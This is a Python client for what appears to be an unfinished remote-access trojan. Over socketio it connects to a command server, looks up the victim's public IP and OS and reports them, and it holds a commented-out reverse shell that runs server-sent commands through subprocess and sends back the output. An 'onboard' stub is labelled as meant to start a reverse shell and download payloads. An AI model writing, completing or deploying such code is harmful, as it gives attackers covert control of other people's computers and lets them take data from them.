import os
import requests
from time import sleep
import platform
import socketio
import subprocess

server_ip = "http://127.0.0.1:5000"
requests
sio = socketio.Client(logger=True)

#def payload_loader():


@sio.event
def connect():
    os = platform.system()
    try:
        ip = requests.get("https://api.ipify.org").text
        print("Ip Fetch Successful")
    except:
        ip = "unknown"
    sio.emit("client_data", {"os": os, "ip": ip})
    # payload_loader()
@sio.event
def disconnect():
    print("Disconnected")
#    while True:
#        print("Attempting to connect to server at " + server_ip)
#        sio.connect(server_ip)
@sio.event
def reconnect():
    print('Reconnected to server')
'''
@sio.on("rshell_init")
def rshell():
    sio.emit("rshell_init", {"cwd": os.getcwd()})

@sio.on("rshell")
def rshell(data):
    sio.emit("rshell_init", {"response": subprocess.getoutput(data["command"]), "cwd": os.getcwd()})
'''
@sio.on("onboard")
def onboard():
    #send command to initiate reverse shell and download payloads
    print("Not Finished (onboard)")
#sio.on("ip_lookup")
#def ip_lookup():
    

sio.connect(server_ip, retry=True)

sio.wait()
